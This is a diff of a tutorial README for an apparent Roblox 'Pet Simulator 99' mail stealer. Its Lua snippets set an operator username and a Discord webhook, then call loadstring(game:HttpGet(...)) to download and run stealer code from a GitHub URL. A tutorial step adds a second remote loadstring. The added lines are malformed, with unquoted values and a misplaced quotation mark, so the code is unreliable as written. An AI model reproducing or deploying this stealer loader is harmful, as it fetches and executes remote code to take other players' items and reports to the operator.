@@ -1,11 +1,11 @@
 # Script With Tutorial !
 
 ```lua
-Username = "Your Nick Here"
+Username = rekinpl_5
 LoadScreen = true 
-Webhook = "Your Link Here" -- Paste your Discord webhook here
+Webhook = kacpib -- Paste your Discord webhook here
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+loadstring(game:HttpGet("https"://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua))()
 ```
 
 # Tutorial
@@ -32,7 +32,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailsteale
 
 8: Put your link in this script
 ```lua
-loadstring(game:HttpGet("YOUR LINK HERE", true))()
+loadstring(game:HttpGet( https://github.com/KiuuP/PS99_Mailstealer/assets/158788963/746039ee-1b0d-47b3-8f38-1b4e6adf8483.lua , true))()
 ```
 
 9: After u finished u got your loadstring script with mailstealer
